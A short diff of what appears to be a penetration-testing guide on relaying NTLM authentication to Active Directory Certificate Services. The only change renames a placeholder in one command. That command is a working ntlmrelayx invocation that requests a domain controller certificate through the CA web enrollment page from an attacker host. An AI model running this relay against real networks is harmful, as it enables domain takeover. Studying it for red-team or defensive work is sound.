@@ -48,7 +48,7 @@ A regular domain user with no special privileges.
 
 # Steps to Create
 ## 1. Set up NTLM Relay on our attacker host to forward the captured authentication to ADCS Web UI
-`ntlmrelayx.py -t http://<CAServer>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`
+`ntlmrelayx.py -t http://<CA_Server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController`
 
 ![ntlm-relay-start](ntlm-relay-start.jpg)
 
